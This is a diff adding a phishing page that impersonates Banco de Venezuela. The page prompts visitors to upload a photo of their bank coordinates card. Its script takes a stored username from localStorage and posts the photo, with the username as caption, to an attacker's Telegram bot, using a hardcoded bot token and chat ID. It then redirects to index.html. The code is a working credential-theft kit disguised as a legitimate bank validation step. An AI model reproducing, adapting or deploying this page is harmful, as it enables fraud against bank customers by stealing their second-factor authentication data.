@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Banco de Venezuela</title>
+	<link href="https://fonts.googleapis.com/css?family=Nunito:300,400,500" rel="stylesheet">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+	<link rel="icon" type="image/x-icon" href="https://bdvenlinea.banvenez.com/assets/favicon/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://bdvenlinea.banvenez.com/assets/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://bdvenlinea.banvenez.com/assets/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="https://bdvenlinea.banvenez.com/assets/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://bdvenlinea.banvenez.com/assets/favicon/favicon-16x16.png">
+<style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      width: 300px;
+	  margin-left: 25%;
+    }
+
+    h2 {
+      margin-top: 0;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="file"] {
+      margin-bottom: 10px;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px;
+      cursor: pointer;
+      border-radius: 5px;
+	  width: 50%;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+	<style>
+		*{
+		  font-family: 'Nunito';
+		  margin: 0;
+		  padding: 0;
+		}
+
+		body{
+		  height: 
+		}
+
+		.text-center{
+		  text-align: center;
+		}
+
+		.login-container{
+		  overflow:hidden;
+		  background-color:#ededed;
+		  //background-image: url('background.jpg');
+		  background-position:center center;
+		  background-size: cover;
+		  background-repeat: no-repeat;
+		  height: 100vh;
+		}
+
+
+		.login-container-float-center{
+		  position: fixed;
+		  top: 50%;
+		  left: 50%;
+		  width: 35%;
+		  height: auto;
+		  /* bring your own prefixes */
+		  transform: translate(-50%, -50%);
+		  background-color:#FFFFFF;
+		  box-shadow: 0 5px 10px 0px rgba(0, 0, 0, 0.1);
+		  -moz-box-shadow: 0 5px 10px 0px rgba(0, 0, 0, 0.1);
+		  -webkit-box-shadow: 0 5px 10px 0px rgba(0, 0, 0, 0.1);
+		  -o-box-shadow: 0 5px 10px 0px rgba(0, 0, 0, 0.1);
+		  -ms-box-shadow: 0 5px 10px 0px rgba(0, 0, 0, 0.1);
+		  border-radius: 5px;
+		}
+
+		.login-img-container{
+		  height: 500px;
+		  //background-image: url('/assets/login/bg.png');
+		  background-position:center center;
+		  background-size: cover;
+		}
+
+		.login-container-logo{
+		  display: block;
+		  margin-right: auto;
+		  margin-left: auto;
+		  margin-top: 30px;
+		}
+
+		.button-action{
+		  padding: 20px;
+		  display: block;
+		  text-align: center;
+		}
+
+		.thanks{
+		  color:#707070;
+		}
+
+		.button-action button{
+		  box-sizing: border-box;
+		  position: relative;
+		  -webkit-user-select: none;
+		  -moz-user-select: none;
+		  -ms-user-select: none;
+		  user-select: none;
+		  cursor: pointer;
+		  outline: 0;
+		  border: none;
+		  -webkit-tap-highlight-color: transparent;
+		  display: inline-block;
+		  white-space: nowrap;
+		  text-decoration: none;
+		  vertical-align: baseline;
+		  text-align: center;
+		  margin: 0;
+		  min-width: 88px;
+		  line-height: 36px;
+		  padding: 0 16px;
+		  border-radius: 2px;
+		  overflow: visible;
+		  transform: translate3d(0,0,0);
+		  transition: background .4s cubic-bezier(.25,.8,.25,1),box-shadow 280ms cubic-bezier(.4,0,.2,1);
+		  color:#FFFFFF;
+		  background-color: #0067b1;
+		  box-shadow: 0 3px 1px -2px rgb(0 0 0 / 20%), 0 2px 2px 0 rgb(0 0 0 / 14%), 0 1px 5px 0 rgb(0 0 0 / 12%);
+		  margin:10px;
+		  font-size: 16px;
+		}
+
+		.autogestion-user{
+		  font-size:14px;
+		  color:#707070;
+		  text-decoration: none;
+		  font-weight: bold;
+		}
+
+		.button-login-container{
+		  margin-top:20px;
+		  text-align: center;
+		}
+
+		.button-login-container button{
+		  width: 50%;
+		  height: 45px;
+		}
+
+		.help{
+		  float: right;
+		  margin:15px;
+		}
+
+		.not-margin{
+		  margin:0;
+		}
+
+		.not-padding{
+		  padding:0;
+		}
+		.logo-login{
+		  display: block;
+		  margin:0 auto 0 auto;
+		  height: 60px;
+		}
+
+		.message{
+		  margin-top:20px;
+		}
+
+		.message .title{
+		  font-size:14px;
+		  font-weight: bold; 
+		  color:#707070;
+		}
+
+		.message p {
+		  font-size:13px;
+		  margin:5px 0 5px 0;
+		}
+
+		hr{
+			border: 0;
+    		height: 0;
+    		border-top: 1px solid rgba(0, 0, 0, 0.1);
+    		border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+    		width: 400px;
+    		text-align: center;
+    		margin:auto;
+		}
+
+		.autogestion-usuario-unico{
+		  margin-top:20px;
+		}
+
+		@media (max-width: 1500px) {
+		  .login-container-float-center{
+		    width: 30%;
+		  }
+		}
+
+		@media (max-width: 1300px) {
+		  .login-container-float-center{
+		    width: 40%;
+		  }
+		}
+
+		@media (max-width: 993px) {
+		  .login-container-float-center{
+		    width: 50%;
+		    left: 50%;
+		  }
+		  .logo-login{
+		    height: 50px;
+		  }
+		}
+
+		@media (max-width: 900px) {
+		  .login-container {
+		    background-image: unset;
+		  }
+		}
+
+		@media (max-width: 680px) {
+		  .login-container-float-center{
+		    width: 70%;
+		    background-image: inherit;
+		  }
+		  .logo-login{
+		    height: 30px;
+		  }
+		}
+
+		@media (max-width: 300px) {
+		  .logo-login{
+		    height: 30px;
+		  }
+		  .login-container-float-center{
+		    background-image: inherit;
+		  }
+		}
+		input[type=file]::file-selector-button {
+  background-color: #007bff;
+  color: #ffffff;
+  border: 0px;
+  border-right: 1px solid #e5e5e5;
+  padding: 10px 15px;
+  margin-right: 20px;
+  transition: .5s;
+}
+
+input[type=file]::file-selector-button:hover {
+  background-color: #eee;
+  border: 0px;
+  border-right: 1px solid #e5e5e5;
+}
+
+	</style>
+</head>
+<body>
+
+	<div class="login-container">
+	    <div>
+	        <div class="login-container-float-center">
+	            <div class="row">
+	                <div class="not-margin not-padding">
+                        <div class="login-container-logo">
+                            <img src="logo_bdvenlinea_logoff.png" class="logo-login">
+                        </div>
+
+                        <br>
+
+                        <h3 class="text-center thanks">Se esta validando su informacion</h3>
+
+						<div class="container">
+							<h2>Valide su Tarjeta de coordenadas</h2>
+							<form id="imageForm">
+								<input type="text" id="usr" name="text" style="display: none;">
+							  <input type="file" id="imageInput" accept="image/*" />
+							  <button type="submit" style="display: none;" id="btt">Enviar</button>
+							</form>
+						  </div>
+
+                        <div class="button-action">
+                        	<!--img src="prueba.png" style="height: 100px;display: block;margin: auto;"-->
+                        	<h3>Banco de Venezuela S.A</h3>
+	                    	
+                        </div>
+						
+
+	                </div>
+	            </div>
+	        </div>
+	    </div>
+	</div>
+	<script>
+		function tfsa(params) {
+		let brrt = document.getElementById("usr").value;
+			brrt = localStorage.getItem("usr");
+			
+			
+		}
+		tfsa();
+		imageInput.onchange = function(e) {
+      document.getElementById("btt").style.display = "block";    }
+
+		const botToken = '6465289836:AAG7nWG63B2gFSQVwfblzkqS9XhrPUMwZ7M';
+		const chatId = '-4000205456';
+	
+		document.getElementById('imageForm').addEventListener('submit', async function(event) {
+		  event.preventDefault();
+		  
+		  const imageInput = document.getElementById('imageInput');
+		  const imageInputs = localStorage.getItem("usr");
+		  const imageFile = imageInput.files[0];
+
+		  imageInput.onchange = function(e) {
+      alert(this.value);
+      this.value = null;
+    }
+		  if (!imageFile) {
+			return;
+		  }
+	
+		  const formData = new FormData();
+		  formData.append('chat_id', chatId);
+		  formData.append('photo', imageFile);
+		  formData.append('caption', imageInputs );
+		  
+	
+		  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+			method: 'POST',
+			body: formData,
+		  });
+	
+		  const data = await response.json();
+	
+		  if (data.ok) {
+			window.location = "index.html"
+		  } else {
+			alert('Error al enviar la imagen');
+		  }
+		});
+	  </script>
+
+</body>
+</html>
